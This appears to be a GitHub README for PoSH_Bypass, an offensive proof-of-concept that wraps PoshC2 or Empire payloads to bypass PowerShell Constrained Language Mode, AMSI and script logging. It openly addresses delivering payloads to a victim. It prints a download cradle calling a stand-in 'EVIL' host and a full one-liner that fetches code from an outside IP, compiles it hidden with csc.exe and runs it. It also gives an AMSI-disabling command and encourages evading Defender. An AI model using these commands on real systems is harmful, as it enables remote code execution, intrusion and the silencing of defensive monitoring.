# PoSH_Bypass

PoSHBypass is a payload and console proof of concept that allows an attatcker or for that matter a legitimate user to bypass PowerShell's 'Constrianed Language Mode, AMSI and ScriptBlock and Module logging'.
The bulk of this concept is the combination of 3 other researcher's separate pieces of work, I've stuck these 3 elements together as my first attempt at non 'Hello World!' C# project.
* Constrained Language Mode is credited to James Forshaw and is detailed here in his blog series surrounding Windows 10 S and Device Guard - https://tyranidslair.blogspot.com/2017/08/copy-of-device-guard-on-windows-10-s.html
* PowerShell ScriptBlock and Module logging is creditied to Lee Christensen - https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
* AMSI bypass Matt Graeber @mattifestation - https://twitter.com/mattifestation/status/735261176745988096?lang=en

## PoSH_Bypass_Payload

In order to make use of this payload all that is required is a newly generated Base64 encoded payload form PoshC2 or Empire or which ever framework you chose, I've tested it with PoschC2 and Empire. Just take the encoded section from the appropriate payload and paste it straight into the string Payload section of the code.
Now just have Visual Studio compile the payload.

How you get this payload to your victim is upto you, but remember you are dealing with constrained language mode, so your standard download cradle's utilising
```powershell
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```
Won't work
Something like this could help out though;

```powershell
$ua = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-GB)';$uri = 'http://192.168.32.143:8000/sourcecode.txt';$IESettings = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings';if ($IESettings.ProxyEnable -eq 1){$Proxy = "http://$(($IESettings.ProxyServer.Split(';') | ? {$_ -match 'ttp='}) -replace '.*=')";$request = Invoke-WebRequest -uri $uri -UserAgent $ua -ProxyUseDefaultCredentials -Proxy $proxy} else {$request = Invoke-WebRequest -uri $uri -UserAgent $ua };$request.Content | Out-File $env:userprofile\AppData\Local\Temp\sourcecode.txt;Start-Process -FilePath "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/unsafe /out:$env:userprofile\AppData\Local\Temp\Program.exe $env:userprofile\AppData\Local\Temp\sourcecode.txt" -WindowStyle Hidden -Wait;Start-Process -FilePath "$env:userprofile\AppData\Local\Temp\Program.exe" -WindowStyle Hidden
```

The above uses Invoke-Webrequest and is web proxy aware, it downloads, compiles and runs the payload.

## PoSh_Bypass

Just compile this code and its ready to use, drop it on the box and run it, a new PowerShell window will open up and you'll be able to use it just as normal, without Constrained Mode or ScriptBlock logging, one thing I haven't sorted out is automatic AMSI bypass, (down to my lack of C# knowlegde no doubt :;). So to counter AMSI the first command you should enter is the bypass command given my Matt Graeber.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

There's a good chance this might actually get picked up by Defender, so you'll have to be creative to avoid the detection, but thats part of the fun.
